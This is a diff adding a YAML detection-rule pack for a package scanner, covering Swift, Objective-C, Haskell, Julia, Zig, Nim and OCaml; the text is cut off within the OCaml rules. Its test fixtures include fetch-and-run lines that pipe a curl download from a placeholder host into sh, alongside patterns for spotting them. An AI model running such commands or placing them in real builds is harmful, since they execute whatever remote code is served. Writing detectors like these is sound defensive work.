@@ -1,0 +1,1344 @@
+pack:
+  id: cordon.capabilities.swift-objc-haskell-julia-zig-nim-ocaml-clojure
+  version: 0.2.0
+  license: Apache-2.0
+  source: cordon-builtin
+  description: >
+    Capability primitives for Swift, Objective-C, Haskell, Julia, Zig, Nim, OCaml and Clojure
+    (advanced gap P4). Swift had advisories but no behaviour rules, so a malicious Swift package was
+    judged by the language-agnostic rules alone; the others had neither. The language-agnostic packs
+    already give these languages decode, egress, credential, reconnaissance, delay, anti-analysis,
+    mining and wallet signals; this pack adds what only each language's own idioms show. It defines
+    the same primitive names every other pack defines, so each language inherits the behavioural
+    rules in cordon.composites unchanged.
+
+    The build-time entry points are covered by name: SwiftPM's `Package.swift`, Zig's `build.zig`
+    and Nim's `.nimble` NimScript all run on a consumer's machine when the package is built or
+    installed.
+
+    Where a language has no capability, it gets no rule for it: Zig has no object deserialiser and
+    Nim's `marshal` is typed and rebuilds data, not live objects, so neither has a `deserialize`
+    rule here; Swift and Zig have no string evaluator, so their `execute` is loading native code or
+    a script engine by name.
+    Every example below is a single harmless line naming an API; none is a working payload.
+
+rules:
+  # ---------------------------------------------------------------------
+  # Swift
+  # ---------------------------------------------------------------------
+  - id: CAP.SWIFT.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '\bData\s*\(\s*base64Encoded\s*:'
+    tests:
+      positive:
+        - "let raw = Data(base64Encoded: blob)"
+      negative:
+        - "let text = raw.base64EncodedString()"
+
+  - id: CAP.SWIFT.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '\.decompressed\s*\(\s*using\s*:'
+        - '\bcompression_decode_buffer\s*\('
+    tests:
+      positive:
+        - "let raw = try (blob as NSData).decompressed(using: .zlib)"
+        - "let n = compression_decode_buffer(dst, cap, src, len, nil, COMPRESSION_ZLIB)"
+      negative:
+        - "let packed = try (raw as NSData).compressed(using: .zlib)"
+
+  - id: CAP.SWIFT.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Runs code it was handed as data
+    message: >
+      Swift has no string evaluator. This file hands a string to a script engine (JavaScriptCore,
+      AppleScript) or loads a native library by path, which is how Swift code runs what it was not
+      compiled with.
+    remediation: Confirm what is evaluated or loaded is shipped with the package and fixed.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '\.evaluateScript\s*\('
+        - '\bNSAppleScript\s*\(\s*source\s*:'
+        - '\bdlopen\s*\('
+    tests:
+      positive:
+        - "context.evaluateScript(source)"
+        - "let script = NSAppleScript(source: text)"
+        - "let handle = dlopen(path, RTLD_NOW)"
+      negative:
+        - "let context = JSContext()"
+
+  - id: CAP.SWIFT.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      The insecure NSKeyedUnarchiver entry points rebuild any class the archive names.
+      `unarchivedObject(ofClass:from:)` restricts the classes and is not matched.
+    remediation: Use `unarchivedObject(ofClass:from:)` or a data-only format such as JSON.
+    languages: [swift]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bNSKeyedUnarchiver\s*\.\s*unarchiveObject\s*\('
+        - '\bunarchiveTopLevelObjectWithData\s*\('
+        - '\bNSUnarchiver\b'
+    tests:
+      positive:
+        - "let obj = NSKeyedUnarchiver.unarchiveObject(with: data)"
+        - "let obj = try NSKeyedUnarchiver.unarchiveTopLevelObjectWithData(data)"
+      negative:
+        - "let obj = try NSKeyedUnarchiver.unarchivedObject(ofClass: Note.self, from: data)"
+
+  - id: CAP.SWIFT.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: This file starts an external process.
+    remediation: Pass a fixed executable and an argument list rather than a shell string.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '\bProcess\s*\(\s*\)'
+        - '\.(?:executableURL|launchPath)\s*='
+        - '\bposix_spawnp?\s*\('
+        - '\bNSTask\b'
+    tests:
+      positive:
+        - "let task = Process()"
+        - "task.executableURL = URL(fileURLWithPath: tool)"
+        - "posix_spawn(&pid, path, nil, nil, argv, environ)"
+      negative:
+        - "let info = ProcessInfo.processInfo"
+
+  - id: CAP.SWIFT.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      Text read from a URL is handed straight to a script engine: what runs is whatever the remote
+      host served at that moment.
+    remediation: Ship the script with the package, or verify it against a known digest first.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '(?:evaluateScript|NSAppleScript)\s*\([^)\n]{0,40}String\s*\(\s*contentsOf\s*:'
+    tests:
+      positive:
+        - "context.evaluateScript(try String(contentsOf: remote))"
+        - "let s = NSAppleScript(source: try String(contentsOf: remote, encoding: .utf8))"
+      negative:
+        - "let text = try String(contentsOf: local)"
+
+  - id: CAP.SWIFT.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a connection.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [swift]
+    match:
+      kind: regex
+      patterns:
+        - '\bURLSession\b'
+        - '\bNWConnection\s*\('
+        - '(?:String|Data)\s*\(\s*contentsOf\s*:\s*URL\s*\(\s*string\s*:\s*"https?://'
+    tests:
+      positive:
+        - "let (data, _) = try await URLSession.shared.data(from: url)"
+        - "let page = try String(contentsOf: URL(string: \"https://example.test/a\")!)"
+      negative:
+        - "let file = URL(fileURLWithPath: path)"
+
+  # ---------------------------------------------------------------------
+  # Objective-C
+  # ---------------------------------------------------------------------
+  - id: CAP.OBJC.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '\binitWithBase64Encoded(?:String|Data)\s*:'
+    tests:
+      positive:
+        - "NSData *raw = [[NSData alloc] initWithBase64EncodedString:blob options:0];"
+      negative:
+        - "NSString *text = [raw base64EncodedStringWithOptions:0];"
+
+  - id: CAP.OBJC.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '\bdecompressedDataUsingAlgorithm\s*:'
+        - '\bcompression_decode_buffer\s*\('
+        - '\binflateInit2?\s*\('
+    tests:
+      positive:
+        - "NSData *raw = [blob decompressedDataUsingAlgorithm:NSDataCompressionAlgorithmZlib error:&e];"
+        - "inflateInit2(&stream, 31);"
+      negative:
+        - "NSData *z = [raw compressedDataUsingAlgorithm:NSDataCompressionAlgorithmZlib error:&e];"
+
+  - id: CAP.OBJC.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Runs code it was handed as data
+    message: >
+      This file hands a string to a script engine (JavaScriptCore, AppleScript) or loads a native
+      library or bundle by path.
+    remediation: Confirm what is evaluated or loaded is shipped with the package and fixed.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '\bevaluateScript\s*:'
+        - '\binitWithSource\s*:'
+        - '\bdlopen\s*\('
+        - '\bNSBundle\s+bundleWithPath\s*:[^\]\n]{0,120}\]\s*load\b'
+    tests:
+      positive:
+        - "[context evaluateScript:source];"
+        - "NSAppleScript *s = [[NSAppleScript alloc] initWithSource:text];"
+        - "void *h = dlopen(path, RTLD_NOW);"
+      negative:
+        - "JSContext *context = [[JSContext alloc] init];"
+
+  - id: CAP.OBJC.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      The insecure NSKeyedUnarchiver entry points rebuild any class the archive names.
+      `unarchivedObjectOfClass:fromData:error:` restricts the classes and is not matched.
+    remediation: Use `unarchivedObjectOfClass:fromData:error:` or a data-only format such as JSON.
+    languages: [objc]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bunarchiveObjectWith(?:Data|File)\s*:'
+        - '\bunarchiveTopLevelObjectWithData\s*:'
+    tests:
+      positive:
+        - "id obj = [NSKeyedUnarchiver unarchiveObjectWithData:data];"
+      negative:
+        - "id obj = [NSKeyedUnarchiver unarchivedObjectOfClass:[Note class] fromData:data error:&e];"
+
+  - id: CAP.OBJC.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: This file starts an external process.
+    remediation: Pass a fixed executable and an argument list rather than a shell string.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '\[\s*NSTask\b'
+        - '\b(?:setLaunchPath|setExecutableURL|launchedTaskWithLaunchPath)\s*:'
+        - '\bposix_spawnp?\s*\('
+        - '(?<![\w.])(?:system|popen)\s*\('
+    tests:
+      positive:
+        - "NSTask *task = [[NSTask alloc] init];"
+        - "[task setLaunchPath:tool];"
+        - "FILE *p = popen(command, \"r\");"
+      negative:
+        - "NSProcessInfo *info = [NSProcessInfo processInfo];"
+
+  - id: CAP.OBJC.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      Text read from a URL is handed straight to a script engine: what runs is whatever the remote
+      host served at that moment.
+    remediation: Ship the script with the package, or verify it against a known digest first.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '(?:evaluateScript|initWithSource)\s*:\s*\[\s*NSString\s+stringWithContentsOfURL\s*:'
+    tests:
+      positive:
+        - "[context evaluateScript:[NSString stringWithContentsOfURL:remote encoding:NSUTF8StringEncoding error:nil]];"
+      negative:
+        - "NSString *text = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];"
+
+  - id: CAP.OBJC.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [objc]
+    match:
+      kind: regex
+      patterns:
+        - '\bNSURL(?:Session|Connection)\b'
+        - '\b(?:stringWithContentsOfURL|dataWithContentsOfURL)\s*:'
+    tests:
+      positive:
+        - "NSURLSession *session = [NSURLSession sharedSession];"
+        - "NSData *d = [NSData dataWithContentsOfURL:remote];"
+      negative:
+        - "NSData *d = [NSData dataWithContentsOfFile:path];"
+
+  # ---------------------------------------------------------------------
+  # Haskell
+  # ---------------------------------------------------------------------
+  - id: CAP.HS.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '\bimport\s+(?:qualified\s+)?Data\.ByteString(?:\.Lazy)?\.Base64\b'
+        - '\bdecodeBase64(?:Lenient|Untyped)?\b'
+    tests:
+      positive:
+        - "import qualified Data.ByteString.Base64 as B64"
+        - "let raw = decodeBase64Lenient blob"
+      negative:
+        - "let text = encodeBase64 raw"
+
+  - id: CAP.HS.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '\bCodec\.Compression\.(?:GZip|Zlib)\b'
+        - '\b(?:GZip|Zlib)\.decompress\b'
+    tests:
+      positive:
+        - "import qualified Codec.Compression.GZip as GZip"
+        - "let raw = GZip.decompress blob"
+      negative:
+        - "let packed = compressWith defaultCompressParams raw"
+
+  - id: CAP.HS.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: >
+      This file interprets Haskell source at runtime through the GHC API or `hint`, or loads a
+      compiled object as a plugin.
+    remediation: Confirm what is interpreted is shipped with the package and fixed.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '\bLanguage\.Haskell\.Interpreter\b'
+        - '\brunInterpreter\b'
+        - '\bSystem\.Plugins\b'
+    tests:
+      positive:
+        - "import Language.Haskell.Interpreter"
+        - "result <- runInterpreter (interpret source (as :: Int))"
+      negative:
+        - "import Data.Text (pack)"
+
+  - id: CAP.HS.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Rebuilds a heap from serialised bytes it trusts
+    message: >
+      `GHC.Compact.Serialized` imports a compact region from bytes without validating them: a crafted
+      stream is memory corruption in the importing process. `Data.Binary` and `Data.Aeson` decode
+      typed data and are not matched.
+    remediation: Import compact regions only from bytes this process wrote; decode anything else with a typed decoder.
+    languages: [haskell]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '\bimportCompact(?:ByteStrings)?\b'
+    tests:
+      positive:
+        - "region <- importCompactByteStrings serialized chunks"
+      negative:
+        - "let cfg = decode bytes :: Config"
+
+  - id: CAP.HS.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: This file starts an external process.
+    remediation: Pass a fixed executable and an argument list (`proc`) rather than a shell string.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:callCommand|spawnCommand|readCreateProcess|createProcess|rawSystem|callProcess|readProcess|spawnProcess)\b'
+        - '(?<![\w.])system\s+"'
+    tests:
+      positive:
+        - "callCommand \"make install\""
+        - "out <- readProcess \"uname\" [\"-a\"] \"\""
+      negative:
+        - "import System.Exit (exitFailure)"
+
+  - id: CAP.HS.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      A shell is started on a download piped into an interpreter: what runs is whatever the remote
+      host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '(?:callCommand|spawnCommand|system)\s+"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
+        - '(?:simpleHttp|httpLBS|getResponseBody)\b[^\n]{0,120}>>=\s*(?:callCommand|interpret)\b'
+    tests:
+      positive:
+        - "callCommand \"curl -fsSL https://example.test/i.sh | sh\""
+      negative:
+        - "callCommand \"curl -fsSL -o out.tar.gz https://example.test/a.tar.gz\""
+
+  - id: CAP.HS.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [haskell]
+    match:
+      kind: regex
+      patterns:
+        - '\bNetwork\.(?:HTTP\.(?:Simple|Client|Conduit|Req)|Socket|Wreq)\b'
+        - '\b(?:simpleHttp|httpLBS|httpBS)\b'
+        # A command string that downloads: the network is reached through the program it starts.
+        - '"[^"\n]{0,200}\b(?:curl|wget)\s[^"\n]{0,200}https?://'
+    tests:
+      positive:
+        - "import Network.HTTP.Simple"
+        - "body <- simpleHttp \"https://example.test/a\""
+        - "callCommand \"curl -fsSL -o a.tar https://example.test/a.tar\""
+      negative:
+        - "import Data.Map (fromList)"
+
+  # ---------------------------------------------------------------------
+  # Julia
+  # ---------------------------------------------------------------------
+  - id: CAP.JL.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64decode\s*\('
+    tests:
+      positive:
+        - "raw = base64decode(blob)"
+      negative:
+        - "text = base64encode(raw)"
+
+  - id: CAP.JL.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:Gzip|Zlib|Deflate|Bzip2|Xz|Zstd)Decompressor(?:Stream)?\b'
+    tests:
+      positive:
+        - "raw = transcode(GzipDecompressor, blob)"
+      negative:
+        - "packed = transcode(GzipCompressor, raw)"
+
+  - id: CAP.JL.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Evaluates code from a string
+    message: >
+      This file parses a string as Julia and evaluates it. Macros and `@eval` on code written in the
+      file are not matched; a string becoming code is.
+    remediation: Confirm what is evaluated is shipped with the package and fixed.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:Core\.)?eval\s*\(\s*(?:\w+\s*,\s*)?Meta\.parse(?:all)?\s*\('
+        - '\binclude_string\s*\('
+    tests:
+      positive:
+        - "eval(Meta.parse(source))"
+        - "include_string(Main, source)"
+      negative:
+        - "include(\"helpers.jl\")"
+
+  - id: CAP.JL.DESERIALIZE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: deserialize
+    title: Turns a serialised byte stream back into live objects
+    message: >
+      Julia's Serialization rebuilds arbitrary objects, including closures, from the stream: it is
+      code execution on untrusted input.
+    remediation: Use a data-only format such as JSON or Arrow for anything that crosses a trust boundary.
+    languages: [julia]
+    references:
+      - https://cwe.mitre.org/data/definitions/502.html
+    match:
+      kind: regex
+      patterns:
+        - '(?<![\w.])(?:Serialization\.)?deserialize\s*\('
+    tests:
+      positive:
+        - "obj = deserialize(io)"
+        - "obj = Serialization.deserialize(IOBuffer(bytes))"
+      negative:
+        - "serialize(io, obj)"
+
+  - id: CAP.JL.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: This file runs an external command.
+    remediation: Prefer a fixed command; Julia's backticks never invoke a shell unless one is named.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:run|read|success|pipeline|open)\s*\(\s*`'
+        - '\bCmd\s*\(\s*\['
+    tests:
+      positive:
+        - "run(`make install`)"
+        - "out = read(`uname -a`, String)"
+      negative:
+        - "run_tests(suite)"
+
+  - id: CAP.JL.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      The result of a download is included or evaluated directly: what runs is whatever the remote
+      host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\binclude\s*\(\s*(?:Downloads\.)?download\s*\('
+        - '(?:include_string|Meta\.parse)\s*\([^)\n]{0,40}String\s*\(\s*HTTP\.get\s*\('
+    tests:
+      positive:
+        - "include(download(\"https://example.test/setup.jl\"))"
+      negative:
+        - "path = download(\"https://example.test/data.csv\")"
+
+  - id: CAP.JL.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [julia]
+    match:
+      kind: regex
+      patterns:
+        - '\bHTTP\.(?:get|post|put|request)\s*\('
+        - '(?<![\w.])(?:Downloads\.)?download\s*\(\s*"https?://'
+        - '\bSockets\.connect\s*\('
+    tests:
+      positive:
+        - "r = HTTP.get(\"https://example.test/a\")"
+        - "path = download(\"https://example.test/data.csv\")"
+      negative:
+        - "using LinearAlgebra"
+
+  # ---------------------------------------------------------------------
+  # Zig
+  # ---------------------------------------------------------------------
+  - id: CAP.ZIG.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64\.(?:standard|url_safe)(?:_no_pad)?\.Decoder\b'
+    tests:
+      positive:
+        - "try std.base64.standard.Decoder.decode(out, blob);"
+      negative:
+        - "_ = std.base64.standard.Encoder.encode(out, raw);"
+
+  - id: CAP.ZIG.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '\bstd\.compress\.(?:gzip|zlib|flate|zstd|xz|lzma)\b'
+    tests:
+      positive:
+        - "var stream = std.compress.gzip.decompressor(reader);"
+      negative:
+        - "const list = std.ArrayList(u8).init(allocator);"
+
+  - id: CAP.ZIG.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Loads native code at runtime
+    message: >
+      Zig has no string evaluator. This file opens a shared library by path, which runs that
+      library's initialisers and hands its symbols to the program.
+    remediation: Confirm the library is shipped with the package and fixed.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '\bstd\.DynLib\.open\b'
+        - '\bDynLib\.open\s*\('
+    tests:
+      positive:
+        - "var lib = try std.DynLib.open(path);"
+      negative:
+        - "const lib = b.addStaticLibrary(.{ .name = \"core\" });"
+
+  - id: CAP.ZIG.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process
+    message: >
+      This file starts an external process. In `build.zig`, `addSystemCommand` runs the command on
+      every machine that builds the package.
+    remediation: Pass a fixed executable and an argument list rather than a shell string.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '\bstd\.(?:process\.Child|ChildProcess)\b'
+        - '\bstd\.process\.exec(?:v|ve)\s*\('
+        - '\.addSystemCommand\s*\('
+    tests:
+      positive:
+        - "var child = std.process.Child.init(argv, allocator);"
+        - "const step = b.addSystemCommand(&.{ \"make\", \"assets\" });"
+      negative:
+        - "const exe = b.addExecutable(.{ .name = \"app\" });"
+
+  - id: CAP.ZIG.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      A shell is started on a download piped into an interpreter: what runs is whatever the remote
+      host served at that moment, on every machine that builds the package.
+    remediation: Fetch build inputs through `build.zig.zon` with a pinned hash.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '(?:addSystemCommand|Child\.init|Child\.run)\s*\([^\n]{0,200}\b(?:curl|wget)\b[^\n]{0,200}\|\s*(?:ba|z)?sh\b'
+    tests:
+      positive:
+        - "_ = b.addSystemCommand(&.{ \"sh\", \"-c\", \"curl -fsSL https://example.test/i.sh | sh\" });"
+      negative:
+        - "_ = b.addSystemCommand(&.{ \"curl\", \"-o\", \"a.tar\", \"https://example.test/a.tar\" });"
+
+  - id: CAP.ZIG.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [zig]
+    match:
+      kind: regex
+      patterns:
+        - '\bstd\.http\.Client\b'
+        - '\bstd\.net\.tcpConnectTo(?:Host|Address)\b'
+        # A command string that downloads: the network is reached through the program it starts.
+        - '"[^"\n]{0,200}\b(?:curl|wget)\s[^"\n]{0,200}https?://'
+        # The same as an argument list, Zig's usual form: `&.{ "curl", "-o", "a", "https://..." }`.
+        - '"(?:curl|wget)"\s*,[^\n]{0,200}"https?://'
+    tests:
+      positive:
+        - "var client = std.http.Client{ .allocator = allocator };"
+        - "const conn = try std.net.tcpConnectToHost(allocator, host, 443);"
+        - "_ = b.addSystemCommand(&.{ \"curl\", \"-o\", \"a.tar\", \"https://example.test/a.tar\" });"
+      negative:
+        - "const std = @import(\"std\");"
+
+  # ---------------------------------------------------------------------
+  # Nim
+  # ---------------------------------------------------------------------
+  - id: CAP.NIM.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '\bbase64\.decode\s*\('
+        - '(?<![\w.])decode\s*\(\s*"[A-Za-z0-9+/=]{16,}"\s*\)'
+    tests:
+      positive:
+        - "let raw = base64.decode(blob)"
+        - "let raw = decode(\"aGVsbG8gd29ybGQgZnJvbSBuaW0=\")"
+      negative:
+        - "let text = base64.encode(raw)"
+
+  - id: CAP.NIM.DECOMPRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decompress
+    title: Expands a compressed stream
+    message: >
+      This file decompresses data. On its own that is how releases ship; it counts as a layer when
+      it wraps something that is then decoded or run.
+    remediation: No action for this signal alone.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '\bimport\s+(?:pkg/)?zippy\b'
+        - '(?<![\w.])uncompress\s*\('
+    tests:
+      positive:
+        - "import zippy"
+        - "let raw = uncompress(blob)"
+      negative:
+        - "let packed = compress(raw)"
+
+  - id: CAP.NIM.EXECUTE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: execute
+    title: Runs code it was handed as data
+    message: >
+      This file evaluates NimScript at runtime (`compiler/nimeval`) or loads a shared library by
+      path.
+    remediation: Confirm what is evaluated or loaded is shipped with the package and fixed.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '\bcreateInterpreter\s*\('
+        - '\bevalScript\s*\('
+        - '(?<![\w.])loadLib\s*\('
+    tests:
+      positive:
+        - "let intr = createInterpreter(\"script.nims\", searchPaths)"
+        - "let lib = loadLib(path)"
+      negative:
+        - "import strutils"
+
+  - id: CAP.NIM.SPAWN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: spawn
+    title: Starts a process or subshell
+    message: >
+      This file runs an external command. `staticExec` and `gorge` run it at compile time, and
+      `exec` in a `.nimble` file runs it on install: on the machine of whoever depends on the package.
+    remediation: Pass a fixed executable and an argument list rather than a shell string.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '\b(?:execShellCmd|execProcess|startProcess|execCmd|execCmdEx|staticExec|gorge|gorgeEx)\s*\('
+        - '^\s*exec\s+"'
+    tests:
+      positive:
+        - "discard execShellCmd(\"make install\")"
+        - "const rev = staticExec(\"git rev-parse HEAD\")"
+        - "  exec \"nim c -d:release src/app.nim\""
+      negative:
+        - "echo \"done\""
+
+  - id: CAP.NIM.FETCH_EXEC.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: Downloaded content is executed directly
+    message: >
+      A shell is started on a download piped into an interpreter: what runs is whatever the remote
+      host served at that moment.
+    remediation: Verify a downloaded artefact against a known digest before anything runs it.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '(?:execShellCmd|execProcess|execCmd|execCmdEx|staticExec|gorge|exec)\s*\(?\s*"[^"\n]{0,200}\b(?:curl|wget)\b[^"\n]{0,200}\|\s*(?:ba|z)?sh\b'
+    tests:
+      positive:
+        - "discard execShellCmd(\"curl -fsSL https://example.test/i.sh | sh\")"
+      negative:
+        - "discard execShellCmd(\"curl -fsSL -o a.tar https://example.test/a.tar\")"
+
+  - id: CAP.NIM.EGRESS.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: medium
+    capability: egress
+    title: Opens an outbound network connection
+    message: This file makes an outbound request or opens a socket.
+    remediation: Confirm the destination is a fixed, known host.
+    languages: [nim]
+    match:
+      kind: regex
+      patterns:
+        - '\bnew(?:Async)?HttpClient\s*\('
+        - '\bnew(?:Async)?Socket\s*\('
+        # A command string that downloads: the network is reached through the program it starts.
+        - '"[^"\n]{0,200}\b(?:curl|wget)\s[^"\n]{0,200}https?://'
+    tests:
+      positive:
+        - "let client = newHttpClient()"
+        - "discard execShellCmd(\"curl -fsSL -o a.tar https://example.test/a.tar\")"
+      negative:
+        - "import tables"
+
+  # ---------------------------------------------------------------------
+  # OCaml
+  # ---------------------------------------------------------------------
+  - id: CAP.ML.DECODE.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: decode
+    title: Decodes encoded data
+    message: This file decodes base64 data at runtime.
+    remediation: No action for this signal alone.
+    languages: [ocaml]
+    match:
+      kind: regex
+      patterns:
+        - '\bBase64\.decode(?:_exn)?\b'
+    tests:
+      positive:
